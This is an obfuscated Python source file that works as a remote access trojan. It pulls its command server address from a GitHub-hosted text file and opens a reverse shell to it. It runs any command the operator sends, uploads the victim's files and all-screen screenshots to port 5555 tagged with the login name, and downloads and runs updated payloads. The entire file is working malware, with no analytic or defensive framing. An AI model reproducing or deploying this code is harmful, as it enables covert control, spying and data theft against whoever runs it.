import subprocess,socket,time,requests,os
from PIL import ImageGrab
ySJoQODXRxdhzPg = "05.12.24.4"
MMgoPwNTfKdYIFuuEDYzSWL = ""
xZxIYIhSDbCVi = ""
GkkHhhFXZKAQlRvDooSHuD = "https://raw.githubusercontent.com/eb-repo/files/refs/heads/main/info.txt"
JCBGCOfAACZtPTjA = "https://raw.githubusercontent.com/eb-repo/scripts/refs/heads/main/"
taBMsxStzCc = "!"
def KfokHiJLDBYtGY(host, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((host, int(port) if port.isdecimal() else 5002))
	return s
def UJQikmJqvQVDozvOHFlb(s):
	gRmUdBAnIJSFPpEI = s.recv(1024)
	if len(gRmUdBAnIJSFPpEI)==0:
		return True
	hLHQavAwYjq = gRmUdBAnIJSFPpEI.decode("utf-8").replace("\n","")
	if not hLHQavAwYjq.startswith(taBMsxStzCc):
		proc = subprocess.run(hLHQavAwYjq, shell=True, capture_output=True)
		hHDkHVksfkOnp = proc.stdout + proc.stderr
		s.send(hHDkHVksfkOnp)
		return
	dORNnDVgZUKKBgESiNE = hLHQavAwYjq.split(" ")[0][1:]
	if dORNnDVgZUKKBgESiNE == "download":
		ylwCvCsJEEoJ(s, hLHQavAwYjq)
	elif dORNnDVgZUKKBgESiNE == "screenshot":
		tdeXWlhbhb(s)
	elif dORNnDVgZUKKBgESiNE == "basename":
		s.send(bytes(os.path.basename(__file__)+"\n", "utf-8"))
def ylwCvCsJEEoJ(s, hLHQavAwYjq):
	tCOuMyLuyQoAdNSgueJPn = hLHQavAwYjq.replace(taBMsxStzCc+"download ","").split(",")
	hHDkHVksfkOnps = ""
	for f in tCOuMyLuyQoAdNSgueJPn:
		hHDkHVksfkOnps += rDMKAsQeynRwXkuCKv(f, "api/file/", { "type":os.path.splitext(f)[1] })
	s.send(bytes(hHDkHVksfkOnps, "utf-8"))
def tdeXWlhbhb(s):
	TOYNZYAlMrq = ImageGrab.grab(
		bbox=None,
		include_layered_windows=False,
		all_screens=True,
		xdisplay=None
	)
	NqbROlHgThQzLISNcmlvQ = os.path.expanduser("~\\AppData\\Local\\")+"ss.jpg"
	TOYNZYAlMrq.save(NqbROlHgThQzLISNcmlvQ)
	TOYNZYAlMrq.close()
	r = rDMKAsQeynRwXkuCKv(NqbROlHgThQzLISNcmlvQ, "api/sscap")
	os.remove(NqbROlHgThQzLISNcmlvQ)
	s.send(bytes(r,"utf-8"))
def rDMKAsQeynRwXkuCKv(hFWHgRTWVbeDSuGQDoTdEYQ, mjMoHTnQktdbzU, xWJhWIRHRftiQHQKfwz=None):
	if not os.path.exists(hFWHgRTWVbeDSuGQDoTdEYQ):
		return "[!] 404: "+hFWHgRTWVbeDSuGQDoTdEYQ+"\n"
	headers = {"user":os.getlogin()}
	if xWJhWIRHRftiQHQKfwz is not None:
		headers = {**headers, **xWJhWIRHRftiQHQKfwz}
	requests.post("http://"+MMgoPwNTfKdYIFuuEDYzSWL+":5555/"+mjMoHTnQktdbzU,
		files={"file":open(hFWHgRTWVbeDSuGQDoTdEYQ, "rb")},
		headers=headers)
	return "[+] 200: "+hFWHgRTWVbeDSuGQDoTdEYQ+"\n"
def wOWVYKAaOoEBKweSOpQ():
	global MMgoPwNTfKdYIFuuEDYzSWL, xZxIYIhSDbCVi
	if MMgoPwNTfKdYIFuuEDYzSWL == "" or xZxIYIhSDbCVi == "":
		gRmUdBAnIJSFPpEI = requests.get(GkkHhhFXZKAQlRvDooSHuD).text.replace("\n","").split(":")
		MMgoPwNTfKdYIFuuEDYzSWL = gRmUdBAnIJSFPpEI[0].strip()
		xZxIYIhSDbCVi = gRmUdBAnIJSFPpEI[1].strip()
		AymKJfbCYVNOACBvKPf = gRmUdBAnIJSFPpEI[2].strip()
	return MMgoPwNTfKdYIFuuEDYzSWL, xZxIYIhSDbCVi, AymKJfbCYVNOACBvKPf
def update(AymKJfbCYVNOACBvKPf):
	QcDtGnMOfo = os.path.basename(__file__)
	fileType = QcDtGnMOfo.split(".")[-1]
	RTGDMApMP = QcDtGnMOfo.replace("."+fileType,"") +"."+AymKJfbCYVNOACBvKPf + "."+fileType
	eThmzZEiYkH = os.path.join(os.getcwd(), RTGDMApMP)
	with open(RTGDMApMP, "w+") as f:
		f.write(requests.get(JCBGCOfAACZtPTjA+"file."+ "pyw" if eThmzZEiYkH.split(".")[-1].startswith("py") else "exe").text)
	hLHQavAwYjq = ("" if fileType == "exe" else "python.exe ") + eThmzZEiYkH
	subprocess.run(hLHQavAwYjq, stdin=None, stdout=None, stderr=None)
def HJlaxTYdAHy():
	pass
def WZknxcbXcYZDVyJhv():
	h, p, v = wOWVYKAaOoEBKweSOpQ()
	if ySJoQODXRxdhzPg != v:
		update(v)
	HJlaxTYdAHy()
	KdWcELrdwPci = bytes("["+ySJoQODXRxdhzPg+"] - "+os.getlogin()+" >> ", "utf-8")
	while True:
		try:
			while True:
				FnnbmSNtaMGXQB=False
				try:
					s=KfokHiJLDBYtGY(h, p)
					while not FnnbmSNtaMGXQB:
						s.send(KdWcELrdwPci)
						FnnbmSNtaMGXQB=UJQikmJqvQVDozvOHFlb(s)
					s.close()
				except:
					pass
				time.sleep(5)
		except:
			time.sleep(5)
WZknxcbXcYZDVyJhv()
